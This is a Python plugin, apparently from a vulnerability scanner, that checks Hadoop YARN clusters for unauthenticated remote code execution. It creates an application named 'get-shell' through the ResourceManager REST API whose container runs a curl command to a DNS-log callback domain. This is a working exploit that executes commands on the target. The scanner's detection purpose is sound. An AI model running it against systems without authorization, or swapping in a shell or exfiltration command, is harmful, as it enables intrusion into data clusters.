#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    base_url = '{}://{}:{}'.format(service, ip, port)
    try:
        url = base_url + '/ws/v1/cluster/apps/new-application'
        r = await http_client(ip, port).post(url, json={}, timeout=10)
        if 'application-id' not in r.text:
            return
        app_id = r.json()['application-id']

        domain = dns_monitor(ip, port).add_checker('hadoop-yarn-rce', alert_group='Yarn Unauthorized Access RCE')
        data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': 'curl "http://%s"' % domain,
                },
            },
            'application-type': 'YARN',
        }
        url = base_url + '/ws/v1/cluster/apps'
        await http_client(ip, port).post(url, json=data, headers={"User-Agent": GLOBAL_USER_AGENT}, timeout=20)

    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8089, 'http', False, task_msg={})
    run_plugin_test(scan)
